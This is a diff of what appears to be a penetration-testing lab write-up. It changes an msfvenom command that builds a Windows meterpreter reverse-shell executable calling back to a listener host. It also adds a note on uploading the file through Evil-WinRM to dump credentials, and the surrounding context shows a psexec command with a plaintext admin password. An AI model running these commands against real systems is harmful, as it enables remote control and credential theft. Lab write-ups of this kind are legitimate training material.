@@ -407,12 +407,12 @@ impacket-psexec 'child-admin:R0cky!@#$%@10.10.10.2'
 In this step I built a payload to get a meterpreter in Metaesploit and Dumpear Credentials
 
 ```python
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.250.11 LPORT=9002 -f exe -o reverse.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.250.11 LPORT=9005 -f exe -o reverse.exe
 ```
 
 ![[Pasted image 20250512200042.png]]
 
-
+We uploaded the EXE using the upload command in Evil-WinRM and configured msfconsole accordingly.
 ![[Pasted image 20250512201912.png]]
 
 ![[Pasted image 20250512201519.png]]
